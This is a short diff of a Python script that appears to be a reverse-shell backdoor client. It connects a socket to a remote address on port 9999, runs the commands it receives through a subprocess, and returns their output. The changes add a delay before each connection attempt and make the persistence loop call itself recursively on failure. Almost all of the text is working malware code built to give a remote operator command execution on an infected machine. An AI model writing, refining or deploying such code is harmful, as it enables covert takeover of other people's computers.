@@ -266,7 +266,6 @@ def jalankan_perintah():
             stderr=PIPE,
             stdin=PIPE
         )
-            print(exe)
             data =exe.stdout.read() + exe.stderr.read()
             data = data.decode()
             output = json.dumps(data)
@@ -275,13 +274,12 @@ def jalankan_perintah():
 def execute_persist():
     while True:
         try:
+            time.sleep(3)
             sok.connect((ip, 9999))
             jalankan_perintah()
             sok.close()
             break
         except:
-            try: sok.close()
-            except: pass
-        time.sleep(1)
+            execute_persist()
 
 execute_persist() 
